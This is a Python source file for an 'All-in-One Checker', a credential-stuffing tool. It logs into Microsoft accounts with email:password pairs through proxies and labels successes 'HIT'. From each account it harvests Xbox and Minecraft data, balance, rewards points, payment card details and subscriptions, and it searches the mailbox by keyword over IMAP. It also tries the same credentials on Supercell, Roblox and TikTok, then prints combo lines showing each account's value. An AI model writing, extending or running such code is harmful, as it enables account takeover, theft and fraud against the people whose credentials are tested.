"""
All-in-One Checker — MS + Xbox + MC + Payment + Supercell + Roblox + TikTok.
Fixed: was full of TODO stubs and incomplete feature list. Now fully wired.
"""
import logging
from typing import Dict, List
from .minecraft_checker import MinecraftChecker
from .supercell_checker import SupercellChecker
from .roblox_checker import RobloxChecker
from .tiktok_checker import TikTokChecker

logger = logging.getLogger(__name__)


class AllInOneChecker(MinecraftChecker):
    """
    Complete account check — every feature wired up.
    Runs: MS login → Xbox → Game Pass → Minecraft → Hypixel
           + MS features (balance, rewards, payment, subs)
           + Supercell inbox
           + Roblox inbox
           + TikTok inbox
    """

    def __init__(self, session=None, timeout: int = 20, proxy: str = None,
                 keywords: List[str] = None):
        super().__init__(session, timeout, proxy)
        self.keywords = keywords or []
        self._proxy   = proxy

    def check_full_account(self, email: str, password: str) -> Dict:
        result = {
            'email': email, 'password': password, 'status': 'BAD',
            # MS
            'microsoft_login': False,
            # Xbox
            'has_xbox': False, 'gamertag': None, 'gamerscore': None,
            'has_gamepass': False, 'gamepass_type': None,
            # Minecraft
            'has_minecraft': False, 'mc_username': None, 'mc_uuid': None,
            'mc_capes': [], 'mc_name_change_available': False,
            'hypixel': None,
            # MS features
            'balance': None, 'balance_currency': None,
            'rewards_points': None,
            'payment_methods': [], 'subscriptions': [],
            'billing_addresses': [], 'inbox_matches': [],
            # Supercell
            'has_supercell': False, 'supercell_games': [],
            # Roblox
            'has_roblox': False, 'roblox_username': None,
            'roblox_friends': 0, 'roblox_badges': 0,
            # TikTok
            'has_tiktok': False, 'tiktok_emails': 0, 'tiktok_profiles': [],
        }

        # ── Step 1: MS Login ──────────────────────────────────────────────
        success, status, _token = self.login(email, password)
        if not success:
            result['status'] = status
            return result

        result['microsoft_login'] = True
        result['status']          = 'HIT'

        # ── Step 2: Xbox + Game Pass ──────────────────────────────────────
        try:
            xbox = self.check_game_pass()
            result['has_xbox']      = xbox['has_xbox']
            result['gamertag']      = xbox['gamertag']
            result['gamerscore']    = xbox['gamerscore']
            result['has_gamepass']  = xbox['has_gamepass']
            result['gamepass_type'] = xbox['gamepass_type']
        except Exception as exc:
            logger.debug(f'aio xbox error: {exc}')

        # ── Step 3: Minecraft ─────────────────────────────────────────────
        try:
            mc_tok = self.get_minecraft_token()
            if mc_tok:
                profile = self.get_profile()
                if profile:
                    result['has_minecraft']           = True
                    result['mc_username']             = profile.get('name')
                    result['mc_uuid']                 = profile.get('id')
                    result['mc_capes']                = self.get_capes()
                    result['mc_name_change_available'] = self.check_name_change_available()
                    if result['mc_uuid']:
                        result['hypixel'] = self.get_hypixel_stats(result['mc_uuid'])
                elif self.check_ownership():
                    result['has_minecraft'] = True
        except Exception as exc:
            logger.debug(f'aio mc error: {exc}')

        # ── Step 4: MS Features (balance, rewards, payment, inbox) ────────
        try:
            import time as _time, re as _re
            sess  = self.session
            proxies = self.proxies
            kw    = {'timeout': self.timeout}
            if proxies:
                kw['proxies'] = proxies

            # Balance
            try:
                r = sess.get('https://account.microsoft.com/billing/api/account', **kw)
                if r.status_code == 200:
                    import re
                    m = re.search(r'"balance":(\d+\.?\d*)', r.text)
                    if m:
                        result['balance'] = m.group(1)
                    cm = re.search(r'"currencyCode":"([^"]+)"', r.text)
                    if cm:
                        result['balance_currency'] = cm.group(1)
            except Exception:
                pass

            # Bing Rewards
            try:
                r = sess.get('https://rewards.bing.com/', **kw)
                if r.status_code == 200:
                    ts  = int(_time.time() * 1000)
                    r2  = sess.get(f'https://www.bing.com/rewards/panelflyout/getuserinfo?timestamp={ts}', timeout=10, **(({'proxies': proxies} if proxies else {})))
                    if r2.status_code == 200:
                        bal = r2.json().get('userInfo', {}).get('balance')
                        if bal is not None:
                            result['rewards_points'] = str(bal)
            except Exception:
                pass

            # Payment
            try:
                r = sess.get('https://account.microsoft.com/billing/api/paymentinstruments', **kw)
                if r.status_code == 200:
                    for pi in r.json().get('paymentInstruments', r.json().get('items', [])):
                        ptype = pi.get('type', pi.get('paymentMethodType', 'Unknown'))
                        last4 = pi.get('lastFourDigits', pi.get('last4', ''))
                        brand = pi.get('cardBrand', pi.get('brand', ''))
                        result['payment_methods'].append({'type': ptype, 'last4': last4, 'brand': brand, 'display': f'{brand or ptype} ***{last4}'})
            except Exception:
                pass

            # Subscriptions
            try:
                r = sess.get('https://account.microsoft.com/services/api/subscriptions', **kw)
                if r.status_code == 200:
                    for sub in r.json().get('subscriptions', r.json().get('items', [])):
                        name = sub.get('name', sub.get('friendlyName', 'Unknown'))
                        status_s = sub.get('status', sub.get('state', ''))
                        result['subscriptions'].append({'name': name, 'status': status_s, 'display': f'{name} ({status_s})'})
            except Exception:
                pass

            # Inbox keywords via IMAP
            if self.keywords:
                from checker_engine import _imap_connect
                imap = _imap_connect(email, password, timeout=20)
                if imap:
                    try:
                        imap.select('INBOX', readonly=True)
                        for kw_word in self.keywords[:20]:
                            try:
                                st, data = imap.search(None, f'BODY "{kw_word}"')
                                if st == 'OK' and data[0]:
                                    count = len(data[0].split())
                                    if count > 0:
                                        result['inbox_matches'].append({'keyword': kw_word, 'count': count})
                            except Exception:
                                continue
                    finally:
                        try:
                            imap.logout()
                        except Exception:
                            pass

        except Exception as exc:
            logger.debug(f'aio ms features: {exc}')

        # ── Step 5: Supercell ─────────────────────────────────────────────
        try:
            sc = SupercellChecker(timeout=self.timeout, proxy=self._proxy)
            sc_result = sc.check_full(email, password)
            result['has_supercell']   = sc_result.get('has_supercell', False)
            result['supercell_games'] = sc_result.get('games', [])
        except Exception as exc:
            logger.debug(f'aio supercell: {exc}')

        # ── Step 6: Roblox ────────────────────────────────────────────────
        try:
            rb = RobloxChecker(timeout=self.timeout, proxy=self._proxy)
            rb_result = rb.check_full(email, password)
            result['has_roblox']      = rb_result.get('has_roblox', False)
            result['roblox_username'] = rb_result.get('roblox_username')
            result['roblox_friends']  = rb_result.get('friend_count', 0)
            result['roblox_badges']   = rb_result.get('badge_count', 0)
        except Exception as exc:
            logger.debug(f'aio roblox: {exc}')

        # ── Step 7: TikTok ────────────────────────────────────────────────
        try:
            tt = TikTokChecker(timeout=self.timeout, proxy=self._proxy)
            tt_result = tt.check_full(email, password)
            result['has_tiktok']      = tt_result.get('has_tiktok', False)
            result['tiktok_emails']   = tt_result.get('tiktok_emails', 0)
            result['tiktok_profiles'] = tt_result.get('profiles', [])
        except Exception as exc:
            logger.debug(f'aio tiktok: {exc}')

        return result

    def format_result_string(self, r: Dict) -> str:
        parts = [f"{r['email']}:{r.get('password','?')}"]
        if r.get('microsoft_login'):    parts.append('✓ MS')
        if r.get('has_xbox'):           parts.append(f"✓ Xbox: {r.get('gamertag','?')}")
        if r.get('has_gamepass'):       parts.append(f"✓ {r.get('gamepass_type','GP')}")
        if r.get('gamerscore'):         parts.append(f"GS: {r['gamerscore']}")
        if r.get('has_minecraft'):      parts.append(f"✓ MC: {r.get('mc_username','?')}")
        if r.get('mc_capes'):           parts.append(f"Capes: {', '.join(r['mc_capes'])}")
        if r.get('mc_name_change_available'): parts.append('NameChange: Yes')
        if r.get('balance'):            parts.append(f"Balance: {r['balance']}")
        if r.get('rewards_points'):     parts.append(f"Rewards: {r['rewards_points']}")
        if r.get('payment_methods'):    parts.append(f"Cards: {len(r['payment_methods'])}")
        if r.get('has_supercell'):      parts.append(f"SC: {', '.join(r.get('supercell_games',[]))}")
        if r.get('has_roblox'):         parts.append(f"Roblox: {r.get('roblox_username','?')}")
        if r.get('has_tiktok'):         parts.append(f"TikTok: {r['tiktok_emails']} emails")
        hyp = r.get('hypixel')
        if hyp:
            parts.append(f"Hypixel Lvl:{hyp.get('level',0)}")
        return ' | '.join(parts)
